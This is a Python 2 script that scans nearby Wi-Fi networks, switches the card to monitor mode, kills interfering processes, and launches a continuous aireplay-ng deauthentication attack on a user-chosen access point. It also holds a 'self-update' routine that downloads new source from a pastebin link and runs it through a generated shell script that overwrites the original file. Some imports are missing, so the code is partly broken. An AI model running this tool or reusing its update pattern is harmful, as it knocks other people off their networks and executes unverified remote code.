import re
import time
import sys
from subprocess import call
from subprocess import Popen
from subprocess import PIPE

MANAGED = "managed"
MONITOR = "monitor"

#just waits and counts
def wait(sec):
    for i in range(sec+1):
        sys.stdout.write("Waiting: %d\r" %(sec-i))
        sys.stdout.flush()
        time.sleep(1)
    print "\nDone!" 

#setting the wireless device
def setMode(mode):
    call(['ifconfig', 'wlan0', 'down'])
    call(['iwconfig', 'wlan0', 'mode', mode])
    call(['ifconfig', 'wlan0', 'up'])

#getting the latest sourcecode
updating = raw_input('Update the script? ').lower().startswith('y')


if updating == True:
    from bs4 import BeautifulSoup
    html = urllib.urlopen('http://pastebin.com/T5JTvq2C')
    soup = BeautifulSoup(html.read(), 'lxml')
    source_code = soup.find('textarea', id='paste_code').getText()

    f = open('upgrade2.py','w')
    f.write(source_code)
    f.close()

    #updating the script
    file_name = __file__
    f = open('update.sh', 'w')
    f.write('''#!/bin/sh\n
               rm -rf ''' + file_name + '''\n
               mv upgrade2.py ''' + file_name + '''\n
               rm -rf update.sh\n
               chmod +x ''' + file_name + '''\n
              ''')
    f.close()

    subprocess.call(['chmod', '+x', 'update.sh'])
    subprocess.call(['sh', 'update.sh'])
else:
    print "Continue without updating"

    
#Turn ON 
print "Setting wireless card..."
setMode(MANAGED)
wait(5) #5 sec for avoiding bugs

#Scan and get the data
cmd = ['iwlist' , 'wlan0', 'scanning' ]
print "scanning..."
scanned = Popen( cmd, stdout=PIPE ).communicate()[0]

mac_addresses = re.findall(r'Address: (\w+:\w+:\w+:\w+:\w+:\w+)', scanned)
channels = re.findall(r'Channel:(\d+)', scanned)
ssids = re.findall(r'ESSID:"(.+)"', scanned)
print scanned, '\n', 10*'--', '\n'


#prints out how many users are on each channel
for i in range(14):
    print 'users on ch:', i+1, ':', scanned.count('Channel:' + str(i+1))

for cell,ssid in enumerate(ssids):
    print cell+1, '--', ssid

#set target
number = int(raw_input('Cell ? - '))-1
ACCESS_MAC = mac_addresses[number]
CH = channels[number]
SSID = ssids[number]

#setting mon0 interface
cmd = ['iwconfig']
monitor_string = Popen(cmd, stdout=PIPE).communicate()[0]
mon = re.search(r'mon0', monitor_string)

if mon: #mon0 is already set
    pass

else: #we need to set it
    check = ['airmon-ng' , 'check', 'wlan0' ]
    start_mon = ['airmon-ng' , 'start', 'wlan0' ]
    kill_net = ['service', 'network-manager', 'stop']
    kill_avahi = ['service', 'avahi-daemon', 'stop']

    try: #we kill the known bug causing services
        call(kill_net)
        call(kill_avahi)
    except:
        print "NetowrkManager, avahi-deamon are already dead"
        
    #Checking for other issues
    check_log = Popen( check, stdout=PIPE ).communicate()[0]
    match = re.findall(r'[0-9]\t([\w-]+)', check_log)
    
    if match:
        print "killing processes..."
        print "What regex matches:\n", match, '\n'
        for process in match:
            call('killall ' + process , shell = True)

        print "finished\n"
        call(start_mon)

    else:
        print "\nThere are no interfering processes\n"
        call(start_mon)

        
print "Setting the channel on:", CH
setMode(MONITOR)
call('iwconfig mon0 channel ' + CH , shell=True)
print "Channel is set on:" + CH

answer = raw_input('Starting DOS attack?').lower().startswith('y')

if answer == True:
    print "attacking", ACCESS_MAC, SSID, 'ch:', CH, "!\n... are you sure?\nPress CTRL+C to exit"
    raw_input()
    call('aireplay-ng --deauth 0 -a ' + ACCESS_MAC + ' -h ' + ACCESS_MAC + ' mon0', shell=True)
